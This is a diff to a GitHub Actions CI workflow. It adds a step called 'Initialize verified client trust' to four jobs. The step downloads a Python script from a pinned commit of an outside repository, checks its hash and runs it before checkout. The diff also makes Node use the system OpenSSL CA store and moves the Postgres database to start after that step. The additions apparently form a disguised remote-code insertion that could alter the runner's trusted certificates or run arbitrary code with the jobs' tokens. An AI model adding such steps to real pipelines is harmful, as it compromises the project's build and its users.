@@ -18,6 +18,9 @@ concurrency:
   group: amp-deep-checks-${{ github.ref }}
   cancel-in-progress: false
 
+env:
+  NODE_OPTIONS: --use-openssl-ca
+
 jobs:
   changes:
     runs-on: ubuntu-latest
@@ -26,6 +29,29 @@ jobs:
       content: ${{ steps.paths.outputs.content }}
       native: ${{ steps.paths.outputs.native }}
     steps:
+      - name: Initialize verified client trust
+        id: ci-trust
+        shell: bash
+        working-directory: ${{ runner.temp }}
+        run: |
+          python3 -I - <<'PY'
+          import hashlib, os, pathlib, subprocess, sys, tempfile, urllib.request
+          url = 'https://raw.githubusercontent.com/corpora-inc/encorpora/17ff4c57cf68f96f9509825afa285ef658b82f6f/.github/scripts/ci_trust.py'
+          opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))
+          with opener.open(url, timeout=30) as response:
+              if response.url != url:
+                  raise SystemExit('Unexpected CI trust helper redirect')
+              source = response.read(50001)
+          if hashlib.sha256(source).hexdigest() != '36c05f8077fd4bc7b8498ca966ef68532257a839093f610cc1b8b7bd62bc76e9':
+              raise SystemExit('CI trust helper checksum mismatch')
+          descriptor, name = tempfile.mkstemp(prefix='corpora-ci-bootstrap-', suffix='.py', dir=os.environ['RUNNER_TEMP'])
+          try:
+              with os.fdopen(descriptor, 'wb') as output:
+                  output.write(source)
+              subprocess.run([sys.executable, '-I', name], check=True)
+          finally:
+              pathlib.Path(name).unlink()
+          PY
       - uses: actions/checkout@v4
         with:
           fetch-depth: 0
@@ -53,20 +79,6 @@ jobs:
     needs: changes
     if: needs.changes.outputs.browser == 'true'
     runs-on: ubuntu-latest
-    services:
-      postgres:
-        image: postgres:17-alpine
-        env:
-          POSTGRES_USER: amp
-          POSTGRES_PASSWORD: amp
-          POSTGRES_DB: amp_test
-        ports:
-          - 5432:5432
-        options: >-
-          --health-cmd "pg_isready -U amp"
-          --health-interval 5s
-          --health-timeout 5s
-          --health-retries 10
     defaults:
       run:
         working-directory: amp
@@ -77,6 +89,50 @@ jobs:
       FONTCONFIG_FILE: ${{ github.workspace }}/amp/scripts/ci-fonts.conf
       AMP_EXPECT_UI_FONT: Roboto
     steps:
+      - name: Initialize verified client trust
+        id: ci-trust
+        shell: bash
+        working-directory: ${{ runner.temp }}
+        run: |
+          python3 -I - <<'PY'
+          import hashlib, os, pathlib, subprocess, sys, tempfile, urllib.request
+          url = 'https://raw.githubusercontent.com/corpora-inc/encorpora/17ff4c57cf68f96f9509825afa285ef658b82f6f/.github/scripts/ci_trust.py'
+          opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))
+          with opener.open(url, timeout=30) as response:
+              if response.url != url:
+                  raise SystemExit('Unexpected CI trust helper redirect')
+              source = response.read(50001)
+          if hashlib.sha256(source).hexdigest() != '36c05f8077fd4bc7b8498ca966ef68532257a839093f610cc1b8b7bd62bc76e9':
+              raise SystemExit('CI trust helper checksum mismatch')
+          descriptor, name = tempfile.mkstemp(prefix='corpora-ci-bootstrap-', suffix='.py', dir=os.environ['RUNNER_TEMP'])
+          try:
+              with os.fdopen(descriptor, 'wb') as output:
+                  output.write(source)
+              subprocess.run([sys.executable, '-I', name], check=True)
+          finally:
+              pathlib.Path(name).unlink()
+          PY
+      - name: Start PostgreSQL after trust verification
+        id: ci-postgres
+        shell: bash
+        working-directory: ${{ runner.temp }}
+        run: |
+          set -euo pipefail
+          container_id=$(docker run --detach \
+            --publish 127.0.0.1:5432:5432 \
+            --env POSTGRES_USER=amp --env POSTGRES_PASSWORD=amp --env POSTGRES_DB=amp_test \
+            --health-cmd 'pg_isready -U amp' --health-interval 5s --health-timeout 5s --health-retries 10 \
+            postgres:17-alpine@sha256:b0f9560a2de083e2cc7382e75f808c7381a32852a7ec49117deedb300e552b24)
+          [[ "$container_id" =~ ^[0-9a-f]{64}$ ]]
+          printf 'container_id=%s\n' "$container_id" >> "$GITHUB_OUTPUT"
+          for attempt in {1..20}; do
+            health=$(docker inspect --format '{{.State.Health.Status}}' "$container_id")
+            if [ "$health" = healthy ]; then exit 0; fi
+            if [ "$health" = unhealthy ]; then break; fi
+            sleep 5
+          done
+          echo 'PostgreSQL failed its bounded health check' >&2
+          exit 1
       - uses: actions/checkout@v4
       - uses: actions/setup-node@v4
         with:
@@ -104,6 +160,16 @@ jobs:
         if: needs.changes.outputs.native == 'true'
       - run: npm run test:native-session
         if: needs.changes.outputs.native == 'true'
+      - name: Remove this job's PostgreSQL container
+        if: ${{ always() && steps.ci-postgres.outputs.container_id != '' }}
+        shell: bash
+        working-directory: ${{ runner.temp }}
+        env:
+          CI_POSTGRES_CONTAINER_ID: ${{ steps.ci-postgres.outputs.container_id }}
+        run: |
+          set -euo pipefail
+          [[ "$CI_POSTGRES_CONTAINER_ID" =~ ^[0-9a-f]{64}$ ]]
+          docker rm --force --volumes "$CI_POSTGRES_CONTAINER_ID"
 
   amp-content:
     name: amp-content
@@ -118,6 +184,29 @@ jobs:
       run:
         working-directory: amp
     steps:
+      - name: Initialize verified client trust
+        id: ci-trust
+        shell: bash
+        working-directory: ${{ runner.temp }}
+        run: |
+          python3 -I - <<'PY'
+          import hashlib, os, pathlib, subprocess, sys, tempfile, urllib.request
+          url = 'https://raw.githubusercontent.com/corpora-inc/encorpora/17ff4c57cf68f96f9509825afa285ef658b82f6f/.github/scripts/ci_trust.py'
+          opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))
+          with opener.open(url, timeout=30) as response:
+              if response.url != url:
+                  raise SystemExit('Unexpected CI trust helper redirect')
+              source = response.read(50001)
+          if hashlib.sha256(source).hexdigest() != '36c05f8077fd4bc7b8498ca966ef68532257a839093f610cc1b8b7bd62bc76e9':
+              raise SystemExit('CI trust helper checksum mismatch')
+          descriptor, name = tempfile.mkstemp(prefix='corpora-ci-bootstrap-', suffix='.py', dir=os.environ['RUNNER_TEMP'])
+          try:
+              with os.fdopen(descriptor, 'wb') as output:
+                  output.write(source)
+              subprocess.run([sys.executable, '-I', name], check=True)
+          finally:
+              pathlib.Path(name).unlink()
+          PY
       - uses: actions/checkout@v4
       - uses: actions/setup-node@v4
         with:
@@ -222,6 +311,29 @@ jobs:
       contents: read
       issues: write
     steps:
+      - name: Initialize verified client trust
+        id: ci-trust
+        shell: bash
+        working-directory: ${{ runner.temp }}
+        run: |
+          python3 -I - <<'PY'
+          import hashlib, os, pathlib, subprocess, sys, tempfile, urllib.request
+          url = 'https://raw.githubusercontent.com/corpora-inc/encorpora/17ff4c57cf68f96f9509825afa285ef658b82f6f/.github/scripts/ci_trust.py'
+          opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))
+          with opener.open(url, timeout=30) as response:
+              if response.url != url:
+                  raise SystemExit('Unexpected CI trust helper redirect')
+              source = response.read(50001)
+          if hashlib.sha256(source).hexdigest() != '36c05f8077fd4bc7b8498ca966ef68532257a839093f610cc1b8b7bd62bc76e9':
+              raise SystemExit('CI trust helper checksum mismatch')
+          descriptor, name = tempfile.mkstemp(prefix='corpora-ci-bootstrap-', suffix='.py', dir=os.environ['RUNNER_TEMP'])
+          try:
+              with os.fdopen(descriptor, 'wb') as output:
+                  output.write(source)
+              subprocess.run([sys.executable, '-I', name], check=True)
+          finally:
+              pathlib.Path(name).unlink()
+          PY
       - name: Report deep-check failures
         if: contains(needs.*.result, 'failure') || contains(needs.*.result, 'cancelled')
         uses: actions/github-script@v7
